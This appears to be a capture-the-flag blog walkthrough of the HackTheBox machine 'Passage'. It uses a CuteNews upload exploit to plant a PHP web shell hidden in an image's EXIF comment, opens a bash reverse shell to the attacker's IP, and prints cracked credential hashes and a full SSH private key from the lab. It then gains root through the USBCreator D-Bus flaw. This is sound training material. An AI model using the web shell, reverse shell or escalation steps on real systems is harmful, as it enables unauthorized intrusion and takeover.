---
layout: walkthrough
title: HackTheBox - Passage
date: 2021-03-07 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/passage.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this post forms part of my challenge VM writeups. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Passage --`10.10.10.206`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Rust Scan.

### Rust Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/Passage$ rustscan  10.10.10.206 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/vagrant/.config/rustscan/config.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.206:22
Open 10.10.10.206:80
f[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.10.206

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-12 06:26 EDT
Initiating Ping Scan at 06:26
Scanning 10.10.10.206 [2 ports]
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 06:26 (0:00:00 remaining)
Completed Ping Scan at 06:26, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:26
Completed Parallel DNS resolution of 1 host. at 06:26, 13.01s elapsed
DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 06:26
Scanning 10.10.10.206 [2 ports]
Discovered open port 80/tcp on 10.10.10.206
Discovered open port 22/tcp on 10.10.10.206
Completed Connect Scan at 06:26, 0.20s elapsed (2 total ports)
Nmap scan report for 10.10.10.206
Host is up, received syn-ack (0.20s latency).
Scanned at 2020-09-12 06:26:21 EDT for 14s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
```

</details>


From the output shown above, we can see that the machine is most likely a Linux machine and I added `passage.htb` to the `/etc/hosts` file. As this is a Linux machine and it only has 2 open ports, I started by navigating to the web application.

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img1.png"  style="width: 65%" />
</p>

While poking around, I looked into the source code and found that there were links to `CuteNews`:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img2.png"  style="width: 65%" />
</p>

I changed the URL to navigate to `/CuteNews` and I was presented with a login form as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img3.png"  style="width: 80%" />
</p>

After poking around, I now had access to the following potential usernames and email addresses:
* nadav -- admin mailto:nadav@passage.htb"
* paul -- Paul Coles mailto:paul@passage.htb

I tried using the following `CuteNews` exploit: <https://www.exploit-db.com/exploits/46698>, however the didn't seem to work so I decided to register an account for the web application. After registering, I browsed to the profile page and saw that there was upload functionality. 

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img4.png"  style="width: 65%" />
</p>

### Exploiting CuteNews

There was a second exploit for `CuteNews 2.1.2` which exploited a `Authenticated Arbitrary File Upload` vulnerability: <https://www.exploit-db.com/exploits/48458>. In order to exploit this, I followed the exploit and created a profile picture using the following command:

```bat
vagrant@ko:~/Desktop/HackTheBox/Passage$ cp /usr/share/zenity/clothes/monk.png .
vagrant@ko:~/Desktop/HackTheBox/Passage$ exiftool -Comment='<?php echo "<pre>";
> system($_GET['cmd']); ?>' monk.png;
```

From there, I was able to navigate to the following URL to determine whether it was successful: </CuteNews/uploads/avatar_hotshoto_monk.php?cmd=id>. The output of the request is shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img5.png"  style="width: 65%" />
</p>

Success! Now that I knew that I had command execution, I changed the command to the following simple bash reverse shell payload:

```bat
bash -i >& /dev/tcp/10.10.14.147/1234 0>&1
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img6.png"  style="width: 65%" />
</p>

## Lateral Movement using www-data
After gaining initial access to the host, I started enumerating the web application directory. Looking through I saw a directory called users which contained a number of `.php` files. I opened each file and a few of them contained some base64 strings. Decoding this resulted in a string which also had a md5 hash in it:

```bash
vagrant@ko:~/Desktop/HackTheBox/Passage$ echo "YToyOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO31zOjQ6Im5hbWUiO2E6MTp7czo0OiJ6ZXVzIjthOjExOntzOjI6ImlkIjtzOjEwOiIxNTk5OTEwMjc2IjtzOjQ6Im5hbWUiO3M6NDoiemV1cyI7czozOiJhY2wiO3M6MToiNCI7czo1OiJlbWFpbCI7czoxNDoiYWRtaW5AYWRtaS5odGIiO3M6NDoibmljayI7czowOiIiO3M6NDoicGFzcyI7czo2NDoiOGNjZWM2NjA4N2I5MTc3ZDMyZjFkZDA2YjU3YjUyNjRhMmM3YjdjMmQzYTc1M2JlNWM1ZGI0YWRlNjAxZjljNSI7czozOiJsdHMiO3M6MTA6IjE1OTk5MTA0MjciO3M6MzoiYmFuIjtzOjE6IjAiO3M6NDoibW9yZSI7czo0OiJUanM9IjtzOjY6ImF2YXRhciI7czoyMToiYXZhdGFyX3pldXNfMzg4OTQucGhwIjtzOjY6ImUtaGlkZSI7czowOiIiO319fQ==" | base64 -d
```
```json
a:2:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}s:4:"name";a:1:{s:4:"zeus";a:11:{s:2:"id";s:10:"1599910276";s:4:"name";s:4:"zeus";s:3:"acl";s:1:"4";s:5:"email";s:14:"admin@admi.htb";s:4:"nick";s:0:"";s:4:"pass";s:64:"8ccec66087b9177d32f1dd06b57b5264a2c7b7c2d3a753be5c5db4ade601f9c5";s:3:"lts";s:10:"1599910427";s:3:"ban";s:1:"0";s:4:"more";s:4:"Tjs=";s:6:"avatar";s:21:"avatar_zeus_38894.php";s:6:"e-hide";s:0:"";}}}
```

Eventually, I found a hash for the Paul user within the `b0.php` file:

```json
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
```

Running the hash through CyberChef, I was able to crack the password as shown below:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img9.png"  style="width: 65%" />
</p>


### Lateral Movement using Paul

Uploading `linpeas` to the server showed me that the Paul user had a SSH key associated with the account. I was able to retrieve the key as shown below:

<details>

```bat
paul@passage:/tmp$ cat /home/paul/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/
+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i
Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt
rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ
JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok
sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ
eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG
QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr
lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh
zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz
R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k
7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio
GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4
IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE
LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR
AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0
VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt
1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0
KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1
9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF
d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs
nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY
f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM
Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs
OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==
-----END RSA PRIVATE KEY-----

```

</details>

Using this key, I used SSH to access the machine:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img10.png"  style="width: 80%" />
</p>

Now that I was able to SSH, I looked into `authorized_keys` file which surprisingly also showed that `nadav` used the same shared SSH key for the server. I then moved to that user and had access this their account:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img11.png"  style="width: 80%" />
</p>

## Privilege Escalation using USB Creator D-Bus

Since I had access to the new user, I started with some basic enumeration:

```bat
nadav@passage:~$ groups
nadav adm cdrom sudo dip plugdev lpadmin sambashare
```

There was the possibility for privilege escalation using `lpadmin`, however I didn't have the user's password so I moved on. There were a few exploits based on the groups shown above but nothing really interesting since this wasn't a OSX machine. I decided to poke around a bit more in the paul and nadav directories. Looking around the home folder within the `nadav` user's directory, I found the `.viminfo` file which seemed a little out of place. Looking into the file, it provided command line history of what the user was doing:

<details>

```bat
nadav@passage:~$ cat .viminfo
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

> /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
        "       12      7

> /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
        "       2       0
        .       2       0
        +       2       0

```

</details>

I wasn't sure what the `/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf` file was so I decided to look into that file as well:

<details>

```bat
nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>

  <!-- Only root can own the service -->
  <policy user="root">
    <allow own="com.ubuntu.USBCreator"/>
  </policy>

  <!-- Allow anyone to invoke methods (further constrained by
       PolicyKit privileges -->
  <policy context="default">
    <allow send_destination="com.ubuntu.USBCreator" 
           send_interface="com.ubuntu.USBCreator"/>
    <allow send_destination="com.ubuntu.USBCreator" 
           send_interface="org.freedesktop.DBus.Introspectable"/>
    <allow send_destination="com.ubuntu.USBCreator" 
           send_interface="org.freedesktop.DBus.Properties"/>
  </policy>

</busconfig>

```

</details>


Looking back at the `linPEAS.sh` output, I saw that there was a dbus suid. I hadn't heard of the service before so I did some googling and came across the following: <https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/>.


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img12.png"  style="width: 80%" />
</p>

Following the example in the link, I inspected the `usb-creator-helper` service and it was privileged. Okay this seemed exactly like the correct example to be looking into. Looking for `usb-creator` -- it was running as root!

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img13.png"  style="width: 80%" />
</p>

In order for this exploit to work, it needed to comply with the following prerequisites:
* The user must be in the Sudoers group. Here in our case, Nadav is in the Sudoers group.
* The user must have executable privileges to the dbus tool.

```bat
nadav@passage:~$ find / -perm -u=s -type f 2>/dev/null | grep dbus
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

As shown above, the requirements were satisfied and it was time to launch the attack. I needed to create a file and I decided to simply create a file which contained the public key for my user:

```bat
nadav@passage:~/Desktop$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD3Icb1K14NG3cMsSkbrge7OHo3qj23txEPG9EOV/5EYg7nFAnAYdUs/WEhsVbpPP5FF3cRbow2PGDBzvslZ23PpemKF/X+LozqbPPrtWgKfMdwxNc6efBuLng/bw9FSACZJWTDKTLtiFaDxRM0/SCJjZ9L7gAAk91rWIJpbIeITO0DcUzBVShIQ0OwCsldrUacLPaGcO7jYtv9I6LYd/jGDuquLv1Pzqn0EJkUjFBKEgGhDvVUoBh6DA1rUUT5g/EyuEb1mjVmwNBV5U3QFyLPdKTKa7kUW8eYbM+M5E4LiKXNhEqbvm94bbC92F5sDsXnjLDawF3VkQhIRV9D0mBb5CrfziHzgbNoglOWgbvn9XTmPclZYW34oOw/gegx9X9uuzEOeHQVso4px1dxK9B0jZW48xJ8rFwDH1KTMymOs5zoQ9Iayx8wFaqT8+kOE9QTSY+XII1YEL+uqH3SX04JF5zT2HbIr74sZlmqPOLfGyadabDAcR/jATMvURf4bPk= vagrant@ko" > hotshoto
```

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img14.png"  style="width: 80%" />
</p>

As I already knew the dbus system block was `com.ubuntu.USBCreator` by default, I was able to send a system call to Dbus message. Following on from the example, I was able to use the file created above and add my public key to root's `authorized_keys` file on the server:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/Passage/img15.png"  style="width: 80%" />
</p>

That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.